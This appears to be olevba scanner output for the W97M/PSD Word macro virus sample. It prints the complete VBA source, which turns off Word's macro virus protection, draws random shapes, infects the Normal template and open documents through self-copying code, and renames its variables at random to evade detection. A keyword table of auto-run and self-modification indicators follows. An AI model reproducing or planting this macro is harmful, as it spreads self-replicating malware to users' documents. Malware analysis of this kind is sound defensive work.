olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psd.a-17b530de834cec9d90bfb9c5bf04f997883f14e6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psd.a-17b530de834cec9d90bfb9c5bf04f997883f14e6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If 1 = 1 Then
Randomize: For x = 1 To 10
ActiveDocument.Shapes.AddShape(msoShapePentagon, Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next x: End If
KQ070 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
MM5555 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set OS4894 = ActiveDocument.VBProject.VBComponents.Item(1)
RT9355 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set OS4894 = NormalTemplate.VBProject.VBComponents.Item(1)
LG555 = True
Call QL4115_FG4517
ActiveDocument.Saved = True
End If
If LG555 <> True And RT9355 <> True Then GoTo VH1516
If LG555 = True Then OS4894.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, KQ070 - 1) & vbCr & "Sub ViewVBCode" & vbCr & "End Sub")
If RT9355 = True Then OS4894.CodeModule.AddFromString ("Private Sub Document_Open" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, MM5555 - 3))
VH1516:
If MM5555 <> 0 And KQ070 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub 'W97M/PSD ...porn star dreams? [(c)1998 ALT-F11 code hack]
Private Function QL4115_FG4517()
On Error Resume Next
Randomize
Dim r1(1 To 14) As String
r1(1) = "DI6771": r1(2) = "FE3864": r1(3) = "NV7078": r1(4) = "CT9066": r1(5) = "FG4517": r1(6) = "KQ070"
r1(7) = "MM5555": r1(8) = "RT9355":: r1(9) = "OS4894": r1(10) = "LG555": r1(11) = "VH1516": r1(12) = "QL4115": r1(13) = "QT3138": r1(14) = "JU1435"
For x = 1 To 14
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call FG4517(a1, r1(x))
Next x
End Function 'VAMP v1.0 [thanks Vic!]
Private Function FG4517(JU1435, QT3138 As String)
On Error Resume Next
Dim DI6771 As Long: Dim FE3864 As Long: Dim NV7078 As Long: Dim CT9066 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
DI6771 = 1: FE3864 = 1: NV7078 = .CountOfLines: CT9066 = Len(.Lines(.CountOfLines, 1))
Do While .Find(QT3138, DI6771, FE3864, NV7078, CT9066, True)
strline = .Lines(DI6771, 1)
strline = Left(strline, FE3864 - 1) & JU1435 & Mid(strline, CT9066)
.replaceline DI6771, strline
DI6771 = NV7078 + 1: FE3864 = 1:
NV7078 = .CountOfLines
CT9066 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
